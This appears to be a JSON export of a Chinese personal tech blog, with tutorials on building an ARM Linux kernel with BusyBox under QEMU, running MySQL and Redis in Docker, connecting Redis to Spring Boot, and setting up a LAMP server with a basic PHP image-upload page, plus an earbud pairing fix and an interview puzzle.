03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux gcc: 7.5.0 qemu: 2.11.1(Debian 1:2.11+dfsg-1ubuntu7.26) make:GNU Make 4.1 工具准备Busybox 需手动下载安装，QEMU 等其他工具可在线安装。 Linux内核下载：https://www.kernel.org/ 本文使用5.4.45版本的,并使用清华大学镜像 1wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.4.5.tar.gz Busybox ： 1wget https://busybox.net/downloads/busybox-1.28.4.tar.bz2 环境配置 Linux 内核编译环境需要大量软件包，可提前直接在线安装，或在内核编译的过程中安装，若缺少安装包，内核编译过程中会提示缺失错误。以下是部分需要的软件包，其中部分相同功能的软件包在不同的 Linux 版本下会以不同的名字存在。 1apt-get install gcc qemu qemu-system-arm gcc-arm-linux-gnueabi libncurses5-dev build-essential flex bison bc 编译内核解压 Linux 内核文件包： 1tar -xzvf linux-5.4.5.tar.gz 编译最小文件系统： 解压 busybox,进入目录并编译: 12345tar -jxvf busybox-1.28.4.tar.bz2cd busybox-1.28.4export ARCH=armexport CROSS_COMPILE=arm-linux-gnueabi-make menuconfig 以上内容中，“export”后是指定交叉编译工具链，指定芯片框架为 ARM。如下图所示是图形化界面进行内核配置。 按照以下路径配置成静态编译（回车进入，空格选中） ： Settings —-&gt; Build Options [*]Build static binary(no shared libs) 配置完毕退出后继续完成编译： 1make install 完成后会在目录中生成“_install”目录，本目录存放了编译好的文件系统需要的命令集合，如下图所示： 将上一步骤中生成的“_install”目录拷贝至之前解压后的内核目录，进入“_install”目录，分别创建 etc、dev、mnt、etc/init.d 等目录。 123456cp -r ./busybox-1.28.4/_install ./linux-5.4.5/_installcd ./linux-5.4.5/_install/mkdir etcmkdir devmkdir mntmkdir -p etc/init.d 在“_install/etc/init.d”目录下新建“rcS”文件，并写入以下内容： 123456789mkdir -p /procmkdir -p /tmpmkdir -p /sysmkdir -p /mnt/bin/mount -amkdir -p /dev/ptsmount -t devpts devpts /dev/ptsecho /sbin/mdev &gt; /proc/sys/kernel/hotplugmdev –s 在“_install/etc”目录创建“fstab”文件，并写入以下内容： 12345proc /proc proc defaults 0 0tmpfs /tmp tmpfs defaults 0 0sysfs /sys sysfs defaults 0 0tempfs /dev tmpfs defaults 0 0debugfs /sys/kernel/debug debugfs defaults 0 0 在“_install/etc”目录创建“inittab”文件，并写入以下内容： 1234::sysinit:/etc/init.d/rcS::respawn:-/bin/sh::askfirst:-/bin/sh::ctrlaltdel:/bin/umount -a -r 在“_install/dev”目录中创建如下设备节点。 ： 12mknod console c 5 1mknod null c 1 3 完成上述设置后，在内核目录中编译内核 ： 1234export ARCH=armexport CROSS_COMPILE=arm-linux-gnueabi-make vexpress_defconfigmake menuconfig make menuconfig 设置中，按照以下路径，在 initramfs source file 中填入“_install”(按回车填入) :General setup —-&gt; [*]Initial RAM filesystem and RAM disk (initramfs/initrd) support (_install)Initramfs source file(s) 返回上一层，在 Boot option —-&gt; ()Default kernel command string 回车进入 Default kernel command string 并清 空 。 下 图 中 删 除 原 有 内 容 用Ctl+Backspace 键。 配置 memory split 为“3G/1G user/kernel split”,并打开High Memory Support： Kernel features —-&gt; Memory split(3G/1G user/kernel split) - [*] High Memory Support 在内核目录下编译内核(此步骤时间较长) 12make bzImage ARCH=arm CROSS_COMPILE=arm-linux-gnueabi-make dtbs 可能会出现“./usr/gen_initramfs_list.sh: 131: local: 1: bad variable name”的错误，原因是以前用的bash执行而现在使用sh。 解决办法：131行改为 ： 1local dev=\"`LC_ALL=C ls -l \"${location}\"`\" 编译完成后会有如下提示，并显示编译后内核的存储路径。 运行 QEMU如下所示，输入 QEMU 启动命令，成功启动 QEMU，注意需指定 bzImage路径，并注意使用当前命令与 bzImage 路径的关系。 1qemu-system-arm -M vexpress-a9 -m 256M -kernel arch/arm/boot/zImage -append \"rdinit=/linuxrc console=ttyAMA0 loglevel=8\" -dtb arch/arm/boot/dts/vexpress-v2p-ca9.dtb -nographic 以上命令中参数含义如下；-M：指定硬件芯片框架-m：指定运行内存大小-kernel：指定运行的内核镜像-dtb：指定具体芯片的配置信息-nographic：指定不使用图形界面 完成如下图可以看到，成功运行了我们刚刚编译的新内核","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"},{"name":"操作系统","slug":"操作系统","permalink":"https://czqu.net/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"}],"author":"陈子琦"},{"title":"亲测：解决红米蓝牙耳机只有一边有声音的问题","slug":"release/solve-the-problem-The-Redmi-Bluetooth","date":"2020-01-03T02:00:00.000Z","updated":"2020-01-03T02:00:00.000Z","comments":true,"path":"posts/56389/","permalink":"https://czqu.net/posts/56389/","excerpt":"","text":"前言：之前耳机出问题一直在网上找答案，网上的答案有漏的地方，所以一直失败，所以把我的方案写下来记录一下。 1.手机上取消和耳机的配对 2.在开机状态将两只耳机长按5秒关机，关机后松开（关机的时候两只耳机灯都不亮，如果本身就是关机状态就不用） 3.长按两只耳机，闪白灯，继续按，然后出现一次红白灯闪，不要放手继续按住，直到再出现一次红白灯闪（这很重要）。这是清除配置信息、 手机上记得选择取消配对并关闭蓝牙。 4.先将右耳机开机再将左耳机开机。（一定要放到盒子里，在盒子里拿出来会自动开机，所以只用先把右耳机拿出来） 5.这时候右耳机快闪，当左耳机不闪的时候左右耳机就配对成功了。 6.进入手机蓝牙设置，这时候应该可以连接了","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"https://czqu.net/tags/%E7%94%9F%E6%B4%BB/"}],"author":"陈子琦"},{"title":"docker中安装mysql","slug":"draft/docker-mysql-install","date":"2019-11-18T13:37:52.000Z","updated":"2019-11-18T13:37:52.000Z","comments":true,"path":"posts/15098/","permalink":"https://czqu.net/posts/15098/","excerpt":"","text":"Docker 安装 MySQLMySQL 是世界上最受欢迎的开源数据库。凭借其可靠性、易用性和性能，MySQL 已成为 Web 应用程序的数据库优先选择。 1、查看可用的 MySQL 版本访问 MySQL 镜像库地址：https://hub.docker.com/_/mysql?tab=tags 。 可以通过 Sort by 查看其他版本的 MySQL，默认是最新版本 mysql:latest 。 你也可以在下拉列表中找到其他你想要的版本： 此外，我们还可以用 docker search mysql 命令来查看可用版本： 123456789101112$ docker search mysqlNAME DESCRIPTION STARS OFFICIAL AUTOMATEDmysql MySQL is a widely used, open-source relati... 2529 [OK] mysql/mysql-server Optimized MySQL Server Docker images. Crea... 161 [OK]centurylink/mysql Image containing mysql. Optimized to be li... 45 [OK]sameersbn/mysql 36 [OK]google/mysql MySQL server for Google Compute Engine 16 [OK]appcontainers/mysql Centos/Debian Based Customizable MySQL Con... 8 [OK]marvambass/mysql MySQL Server based on Ubuntu 14.04 6 [OK]drupaldocker/mysql MySQL for Drupal 2 [OK]azukiapp/mysql Docker image to run MySQL by Azuki - http:... 2 [OK]... 2、拉取 MySQL 镜像这里我们拉取官方的最新版本的镜像： 1$ docker pull mysql:latest 3、查看本地镜像使用以下命令来查看是否已安装了 mysql： 1$ docker images 在上图中可以看到我们已经安装了最新版本（latest）的 mysql 镜像。 4、运行容器安装完成后，我们可以使用以下命令来运行 mysql 容器： 1$ docker run -itd --name mysql-latest-test -p 3306:3306 -e MYSQL_ROOT_PASSWORD=czqu123456 mysql 参数说明： -p 3306:3306 ：映射容器服务的 3306 端口到宿主机的 3306 端口，外部主机可以直接通过 宿主机ip:3306 访问到 MySQL 的服务。 MYSQL_ROOT_PASSWORD=123456：设置 MySQL 服务 root 用户的密码。 5、安装成功通过 docker ps 命令查看是否安装成功： 本机可以通过 root 和密码 123456 访问 MySQL 服务。 ​","categories":[],"tags":[]},{"title":"redis整合springboot","slug":"draft/redis-springboot-start","date":"2019-11-18T11:20:33.000Z","updated":"2019-11-18T11:20:33.000Z","comments":true,"path":"posts/9380/","permalink":"https://czqu.net/posts/9380/","excerpt":"","text":"Docker 安装 RedisRedis 是一个开源的使用 ANSI C 语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 的 NoSQL 数据库，并提供多种语言的 API。 1、查看可用的 Redis 版本访问 Redis 镜像库地址： https://hub.docker.com/_/redis?tab=tags。 可以通过 Sort by 查看其他版本的 Redis，默认是最新版本 redis:latest。 你也可以在下拉列表中找到其他你想要的版本： 此外，我们还可以用 docker search redis 命令来查看可用版本： 1234567891011121314$ docker search redisNAME DESCRIPTION STARS OFFICIAL AUTOMATEDredis Redis is an open source ... 2321 [OK] sameersbn/redis 32 [OK]torusware/speedus-redis Always updated official ... 29 [OK]bitnami/redis Bitnami Redis Docker Image 22 [OK]anapsix/redis 11MB Redis server image ... 6 [OK]webhippie/redis Docker images for redis 4 [OK]clue/redis-benchmark A minimal docker image t... 3 [OK]williamyeh/redis Redis image for Docker 3 [OK]unblibraries/redis Leverages phusion/baseim... 2 [OK]greytip/redis redis 3.0.3 1 [OK]servivum/redis Redis Docker Image 1 [OK]... 2、取最新版的 Redis 镜像这里我们拉取官方的最新版本的镜像： 1$ docker pull redis:latest 针对Docker客户端版本大于 1.10.0 的用户 你可以通过修改daemon配置文件/etc/docker/daemon.json来使用加速器 12345678sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'{ \"registry-mirrors\": [\"https://r46f0phk.mirror.aliyuncs.com\"]}EOFsudo systemctl daemon-reloadsudo systemctl restart docker 3、查看本地镜像使用以下命令来查看是否已安装了 redis： 1$ docker images 在上图中可以看到我们已经安装了最新版本（latest）的 redis 镜像。 4、运行容器安装完成后，我们可以使用以下命令来运行 redis 容器： 1$ docker run -itd --name redis-test -p 6379:6379 redis --requirepass \"czqu@123\" 参数说明： -p 6379:6379：映射容器服务的 6379 端口到宿主机的 6379 端口。外部可以直接通过宿主机ip:6379 访问到 Redis 的服务。 –requirepasss 设置密码 docker容器设置开机自启动： 1--restart具体参数值详细信息``no - 容器退出时，不重启容器``on-failure - 只有在非0状态退出时才从新启动容器``always - 无论退出状态是如何，都重启容器 还可以在使用 on-failure 策略时，指定 Docker 将尝试重新启动容器的最大次数；默认情况下，Docker 将尝试永远重新启动容器； 1docker run --restart=on-failure:10 redis 如果创建时未指定 –restart=always ,可通过 update 命令更改； 1docker update --restart=always 容器ID 5、安装成功最后我们可以通过 docker ps 命令查看容器的运行信息： 接着我们通过 redis-cli 连接测试使用 redis 服务。 1$ docker exec -it redis-test /bin/bash ​ 整合springboot1.引入依赖1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.4.0&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;cc.czqu&lt;/groupId&gt; &lt;artifactId&gt;redis-test&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;redis-test&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;11&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;io.lettuce&lt;/groupId&gt; &lt;artifactId&gt;lettuce-core&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 2.创建实体类随便创建一个实现序列化接口的实体类 1234567891011121314package cc.czqu.redistest;import lombok.Data;import java.io.Serializable;@Datapublic class Book implements Serializable { private int id; private String name; private String author;} 3.配置application.properties123456789spring.redis.database=0spring.redis.port=6379spring.redis.password=czqu@123spring.redis.host=192.168.63.129spring.redis.jedis.pool.max-active=8 #最大连接数spring.redis.jedis.pool.max-wait=-1ms #最大阻塞时间 -1表示无限制spring.redis.jedis.pool.min-idle=0 #连接池中最小空闲连接数server.port=9090 4.创建测试类 123456789101112131415161718192021222324252627282930313233343536package cc.czqu.redistest;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.core.StringRedisTemplate;import org.springframework.data.redis.core.ValueOperations;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class BookController { @Autowired RedisTemplate redisTemplate; @Autowired StringRedisTemplate stringRedisTemplate; @GetMapping(\"/test1\") public void test1() { System.out.println(\"hello\"); ValueOperations&lt;String,String&gt; ops1=stringRedisTemplate.opsForValue(); ops1.set(\"name\",\"三国演义\"); String name=ops1.get(\"name\"); System.out.println(name); //实体类的读写 Book book1=new Book(); book1.setId(666); book1.setAuthor(\"陈子琦\"); book1.setName(\"快乐学习\"); ValueOperations&lt;String,Book&gt; ops2= redisTemplate.opsForValue(); ops2.set(\"b1\",book1); Book b1= ops2.get(\"b1\"); System.out.println(b1); }}","categories":[],"tags":[{"name":"后端","slug":"后端","permalink":"https://czqu.net/tags/%E5%90%8E%E7%AB%AF/"},{"name":"redis","slug":"redis","permalink":"https://czqu.net/tags/redis/"},{"name":"springboot","slug":"springboot","permalink":"https://czqu.net/tags/springboot/"}]},{"title":"ubuntu 18.04下搭建LAMP环境","slug":"draft/2019-10-3-Start-LAMP","date":"2019-10-03T02:00:00.000Z","updated":"2019-10-03T02:00:00.000Z","comments":true,"path":"posts/42422/","permalink":"https://czqu.net/posts/42422/","excerpt":"","text":"前言： Linux 操作系统在服务器领域具有广泛的应用。Web 服务是服务器领域中应用最广泛的服务，常见 Web 服务有 WAMP（Windows+Apache+MySQL+PHP）和 LAMP（Linux+Apache+MySQL+PHP）架构，其中 Apache 是全世界最流行的 Web 服务软件，此外，Web 服务软件 nginx，因其具有优秀的性能也受到越来越多的用户欢迎。本文中，演示在 Linux 环境下搭建支持 PHP 等网页的 Web 服务平台，即LAMP。Linux 环境下搭建 Web 服务器有三种方式，一是在安装操作系统时勾选相应服务组件；二是从网上下载或从 ISO 系统镜像包中拷贝安装包手动安装；三是在在连接网络的的情况下在线安装。本文以阿里云 Ubuntu 18.04 64 位操作系统为例安装LAMP，并用PHP实现简单的图片上传功能。 1.安装 Apache 服务器1apt update &amp;&amp; apt install apache2 安装完成后需要手动启动 apache 服务 测试 Apache，在浏览器输入服务器IP 地址，如下图所示，说明 Apache 安装成功。（阿里云等需要在云控制面板打开80端口才能访问） 以上页面详细介绍了 debian 发行版 Linux 中 Apache 基本信息，其中： Apache 根目录：/var/www/htmlApache 配置目录和文件：/etc/apache2：Apache 主配置目录， Apache 所有配置文件均在此目录下；/etc/apache2/apache2.conf：主配置文件，可配置 Apache 全局配置；/etc/apache2/ports.conf：端口配置文件。默认情况下，当启用提供 SSL功能的模块时，Apache 监听端口 80，并在端口 443 上进行监听。其它文件略。Apache 日志文件：/var/log/apache2/access.log:服务请求日志；/var/log/apache2/error.log：服务错误日志。Apache 基本操作：服务启动：/etc/init.d/apache2 start服务停止：/etc/init.d/apache2 stop服务重启：/etc/init.d/apache2 restart部分 Linux 安装 Apache 后可能出现服务正常运行，相应端口正常打开，但其它主机无法访问情况，此现象一般是因为系统防火墙未开放相应服务端口。 以修改端口为例修改配置文件 首先打开/etc/apache2/ports.conf文件,然后修改Listen的内容,最后需要重启apache生效 1&gt;/etc/init.d/apache2 restart 阿里云安全组配置 2.安装 MySQL/MariaDB 本示例采用 MariaDB 代替 MySQL。MariaDB 是 MySQL 的一个分支，现由开源社区维护，采用 GPL 授权许可，其大部分语法与 MySQL 都相同。因 MySQL 被 Oracle收购后有闭源的风险，大部分 Linux 组织均从其套件清单删除了 MySQL，并以MariaDB 代替 MySQL，若一定要使用 MySQL，可通过下载安装包的方式手动安装MySQL。 安装 MariaDB 服务 12sudo apt install mariadb-serversudo apt install mariadb-client 配置 Mariadb 的安全选项: 1sudo mysql_secure_installation 此时系统会提示输入数据库 root 用户密码，因系统并未设置相应密码，此时直接按提示回车即可。若提示错误，则 sudo /etc/init.d/mysql restart 命令重启 mysql 服务并重新执行安全选项命令。随后数据库会提示以下安全设置信息，一般设置数据库 root 用户密码即可，其它选项按回车选择默认：1、Enter current password for root (enter for none): 输入当前 root的密码(因新数据库无密码，回车即可)；2、Set root password? [Y/n] 回车，默认为输入 Y；3、New password: 输入新密码；4、Re-enter new password 确认密码；5、Remove anonymous users? [Y/n] 移除匿名用户；6、Disallow root login remotely? [Y/n] 禁止 root 远程登录；7、Remove test database and access to it? [Y/n] 移除测试数据库；8、Reload privilege tables now? [Y/n] 重新加载权限表。 测试数据库，如图所示，若进入数据库则表示数据库安装成功。 1sudo mysql -u root -p 3.安装PHP 安装 PHP 除了 PHP 应用程序外，还需安装 PHP 与 Apache、MySQL/MariaDB相关扩展包，扩展包需与软件对应，本例中安装 php7.3 版本，对应扩展包可通过以下命令模糊查询。 sudo apt-cache search php7 从 查 询 结 果 可 知 ， php7.2 对 应 Apache 、 MySQL 扩 展 包 分 别 为 ： libapahe2-mod-php7.2，php7.2-mysql。如下图所示为安装 PHP 相关软件包。 1sudo apt-get install php7.2 libapache2-mod-php7.2 php7.2-mysql PHP 安装完毕后需重启 Apache 1/etc/init.d/apache2 restart 4.测试 PHP 页面编辑测试文件，如下图所示，在“/var/www/html”目录下新建“test.php”文件，并输入如下图所示的测试代码 1&lt;?php echo phpinfo();?&gt; 在浏览器中输入测试页面地址，并确认已安装组件,例如： 1http://127.0.0.1/test.php 5.创建文件上传页面文件上传功能由上传文件的 HTML 表单和文件上传脚本构成。在“/var/www/html”目录下创建“upload.html”文件，编辑表单 1&lt;!-- upload.html --&gt;&lt;html&gt;&lt;body&gt;&lt;form action=\"upload.php\" method=\"post\"enctype=\"multipart/form-data\"&gt;&lt;label for=\"file\"&gt;Filename:&lt;/label&gt;&lt;input type=\"file\" name=\"file\" id=\"file\" /&gt; &lt;br /&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Submit\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 在“/var/www/html”目录下创建 “upload.php” 脚本文件，编写文件上传功能代码 1&lt;!-- upload.php --&gt;&lt;?php// 允许上传的图片后缀$allowedExts = array(\"gif\", \"jpeg\", \"jpg\", \"png\");$temp = explode(\".\", $_FILES[\"file\"][\"name\"]);echo $_FILES[\"file\"][\"size\"];$extension = end($temp); // 获取文件后缀名if ((($_FILES[\"file\"][\"type\"] == \"image/gif\")|| ($_FILES[\"file\"][\"type\"] == \"image/jpeg\")|| ($_FILES[\"file\"][\"type\"] == \"image/jpg\")|| ($_FILES[\"file\"][\"type\"] == \"image/pjpeg\")|| ($_FILES[\"file\"][\"type\"] == \"image/x-png\")|| ($_FILES[\"file\"][\"type\"] == \"image/png\"))&amp;&amp; ($_FILES[\"file\"][\"size\"] &lt; 204800) // 小于 200 kb&amp;&amp; in_array($extension, $allowedExts)){ if ($_FILES[\"file\"][\"error\"] &gt; 0) { echo \"错误：: \" . $_FILES[\"file\"][\"error\"] . \"&lt;br&gt;\"; } else { echo \"上传文件名: \" . $_FILES[\"file\"][\"name\"] . \"&lt;br&gt;\"; echo \"文件类型: \" . $_FILES[\"file\"][\"type\"] . \"&lt;br&gt;\"; echo \"文件大小: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB&lt;br&gt;\"; echo \"文件临时存储的位置: \" . $_FILES[\"file\"][\"tmp_name\"] . \"&lt;br&gt;\"; // 判断当前目录下的 upload 目录是否存在该文件 if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) { echo $_FILES[\"file\"][\"name\"] . \" 文件已经存在。 \"; } else { // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下 move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); echo \"文件存储在: \" . \"upload/\" . $_FILES[\"file\"][\"name\"]; } }}else{ echo \"非法的文件格式\";}?&gt; 在目录下创建“upload”目录，用于保存上传的图片。 如下图所示，为上传文件页面。 上传成功的提示：","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"},{"name":"后端","slug":"后端","permalink":"https://czqu.net/tags/%E5%90%8E%E7%AB%AF/"}],"author":"陈子琦"},{"title":"ubuntu 18.04下搭建LAMP环境","slug":"release/2019-10-3-Start-LAMP","date":"2019-10-03T02:00:00.000Z","updated":"2019-10-03T02:00:00.000Z","comments":true,"path":"posts/42422/","permalink":"https://czqu.net/posts/42422/","excerpt":"","text":"前言： Linux 操作系统在服务器领域具有广泛的应用。Web 服务是服务器领域中应用最广泛的服务，常见 Web 服务有 WAMP（Windows+Apache+MySQL+PHP）和 LAMP（Linux+Apache+MySQL+PHP）架构，其中 Apache 是全世界最流行的 Web 服务软件，此外，Web 服务软件 nginx，因其具有优秀的性能也受到越来越多的用户欢迎。本文中，演示在 Linux 环境下搭建支持 PHP 等网页的 Web 服务平台，即LAMP。Linux 环境下搭建 Web 服务器有三种方式，一是在安装操作系统时勾选相应服务组件；二是从网上下载或从 ISO 系统镜像包中拷贝安装包手动安装；三是在在连接网络的的情况下在线安装。本文以阿里云 Ubuntu 18.04 64 位操作系统为例安装LAMP，并用PHP实现简单的图片上传功能。 1.安装 Apache 服务器1apt update &amp;&amp; apt install apache2 安装完成后需要手动启动 apache 服务 测试 Apache，在浏览器输入服务器IP 地址，如下图所示，说明 Apache 安装成功。（阿里云等需要在云控制面板打开80端口才能访问） 以上页面详细介绍了 debian 发行版 Linux 中 Apache 基本信息，其中： Apache 根目录：/var/www/htmlApache 配置目录和文件：/etc/apache2：Apache 主配置目录， Apache 所有配置文件均在此目录下；/etc/apache2/apache2.conf：主配置文件，可配置 Apache 全局配置；/etc/apache2/ports.conf：端口配置文件。默认情况下，当启用提供 SSL功能的模块时，Apache 监听端口 80，并在端口 443 上进行监听。其它文件略。Apache 日志文件：/var/log/apache2/access.log:服务请求日志；/var/log/apache2/error.log：服务错误日志。Apache 基本操作：服务启动：/etc/init.d/apache2 start服务停止：/etc/init.d/apache2 stop服务重启：/etc/init.d/apache2 restart部分 Linux 安装 Apache 后可能出现服务正常运行，相应端口正常打开，但其它主机无法访问情况，此现象一般是因为系统防火墙未开放相应服务端口。 以修改端口为例修改配置文件 首先打开/etc/apache2/ports.conf文件,然后修改Listen的内容,最后需要重启apache生效 1&gt;/etc/init.d/apache2 restart 阿里云安全组配置 2.安装 MySQL/MariaDB 本示例采用 MariaDB 代替 MySQL。MariaDB 是 MySQL 的一个分支，现由开源社区维护，采用 GPL 授权许可，其大部分语法与 MySQL 都相同。因 MySQL 被 Oracle收购后有闭源的风险，大部分 Linux 组织均从其套件清单删除了 MySQL，并以MariaDB 代替 MySQL，若一定要使用 MySQL，可通过下载安装包的方式手动安装MySQL。 安装 MariaDB 服务 12sudo apt install mariadb-serversudo apt install mariadb-client 配置 Mariadb 的安全选项: 1sudo mysql_secure_installation 此时系统会提示输入数据库 root 用户密码，因系统并未设置相应密码，此时直接按提示回车即可。若提示错误，则 sudo /etc/init.d/mysql restart 命令重启 mysql 服务并重新执行安全选项命令。随后数据库会提示以下安全设置信息，一般设置数据库 root 用户密码即可，其它选项按回车选择默认：1、Enter current password for root (enter for none): 输入当前 root的密码(因新数据库无密码，回车即可)；2、Set root password? [Y/n] 回车，默认为输入 Y；3、New password: 输入新密码；4、Re-enter new password 确认密码；5、Remove anonymous users? [Y/n] 移除匿名用户；6、Disallow root login remotely? [Y/n] 禁止 root 远程登录；7、Remove test database and access to it? [Y/n] 移除测试数据库；8、Reload privilege tables now? [Y/n] 重新加载权限表。 测试数据库，如图所示，若进入数据库则表示数据库安装成功。 1sudo mysql -u root -p 3.安装PHP 安装 PHP 除了 PHP 应用程序外，还需安装 PHP 与 Apache、MySQL/MariaDB相关扩展包，扩展包需与软件对应，本例中安装 php7.3 版本，对应扩展包可通过以下命令模糊查询。 sudo apt-cache search php7 从 查 询 结 果 可 知 ， php7.2 对 应 Apache 、 MySQL 扩 展 包 分 别 为 ： libapahe2-mod-php7.2，php7.2-mysql。如下图所示为安装 PHP 相关软件包。 1sudo apt-get install php7.2 libapache2-mod-php7.2 php7.2-mysql PHP 安装完毕后需重启 Apache 1/etc/init.d/apache2 restart 4.测试 PHP 页面编辑测试文件，如下图所示，在“/var/www/html”目录下新建“test.php”文件，并输入如下图所示的测试代码 1&lt;?php echo phpinfo();?&gt; 在浏览器中输入测试页面地址，并确认已安装组件,例如： 1http://127.0.0.1/test.php 5.创建文件上传页面文件上传功能由上传文件的 HTML 表单和文件上传脚本构成。在“/var/www/html”目录下创建“upload.html”文件，编辑表单 1&lt;!-- upload.html --&gt;&lt;html&gt;&lt;body&gt;&lt;form action=\"upload.php\" method=\"post\"enctype=\"multipart/form-data\"&gt;&lt;label for=\"file\"&gt;Filename:&lt;/label&gt;&lt;input type=\"file\" name=\"file\" id=\"file\" /&gt; &lt;br /&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Submit\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 在“/var/www/html”目录下创建 “upload.php” 脚本文件，编写文件上传功能代码 1&lt;!-- upload.php --&gt;&lt;?php// 允许上传的图片后缀$allowedExts = array(\"gif\", \"jpeg\", \"jpg\", \"png\");$temp = explode(\".\", $_FILES[\"file\"][\"name\"]);echo $_FILES[\"file\"][\"size\"];$extension = end($temp); // 获取文件后缀名if ((($_FILES[\"file\"][\"type\"] == \"image/gif\")|| ($_FILES[\"file\"][\"type\"] == \"image/jpeg\")|| ($_FILES[\"file\"][\"type\"] == \"image/jpg\")|| ($_FILES[\"file\"][\"type\"] == \"image/pjpeg\")|| ($_FILES[\"file\"][\"type\"] == \"image/x-png\")|| ($_FILES[\"file\"][\"type\"] == \"image/png\"))&amp;&amp; ($_FILES[\"file\"][\"size\"] &lt; 204800) // 小于 200 kb&amp;&amp; in_array($extension, $allowedExts)){ if ($_FILES[\"file\"][\"error\"] &gt; 0) { echo \"错误：: \" . $_FILES[\"file\"][\"error\"] . \"&lt;br&gt;\"; } else { echo \"上传文件名: \" . $_FILES[\"file\"][\"name\"] . \"&lt;br&gt;\"; echo \"文件类型: \" . $_FILES[\"file\"][\"type\"] . \"&lt;br&gt;\"; echo \"文件大小: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB&lt;br&gt;\"; echo \"文件临时存储的位置: \" . $_FILES[\"file\"][\"tmp_name\"] . \"&lt;br&gt;\"; // 判断当前目录下的 upload 目录是否存在该文件 if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) { echo $_FILES[\"file\"][\"name\"] . \" 文件已经存在。 \"; } else { // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下 move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); echo \"文件存储在: \" . \"upload/\" . $_FILES[\"file\"][\"name\"]; } }}else{ echo \"非法的文件格式\";}?&gt; 在目录下创建“upload”目录，用于保存上传的图片。 如下图所示，为上传文件页面。 上传成功的提示：","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"},{"name":"后端","slug":"后端","permalink":"https://czqu.net/tags/%E5%90%8E%E7%AB%AF/"}],"author":"陈子琦"},{"title":"找工作智力题集锦","slug":"draft/Intelligence-Questions-Collection","date":"2019-08-13T07:58:12.000Z","updated":"2019-08-13T07:58:12.000Z","comments":true,"path":"posts/44209/","permalink":"https://czqu.net/posts/44209/","excerpt":"","text":"1 .0，1，2，3，⋯，499，500共501个数按升序排列，每次取奇数序位的数丢掉，然后取剩下的数的奇数序位的数丢掉，重复这个过程，那么最后剩下的数是多少？答案 ：255 简单例举下：0 1 2 3 4 5 6 7 8 9 10 11 第一次剩下的 1 3 5 7 9 11 规律： 2i-1 （ i为整数 1&lt;=i&lt;= n/2 （n表示给出序列的元素个数，例子中是12，而题目中是501）） 第二次剩下的 3 7 11 4i- 1 1&lt;=i&lt;= n/4 第3次剩下的 7 8i- 1 1&lt;=i&lt;= n/8 相信已经差不多了。每次剩下的元素为 2^x-1 满足条件的只有 255=2^8-1 .当然这是选择题可以直接选答案。 正确做法是： 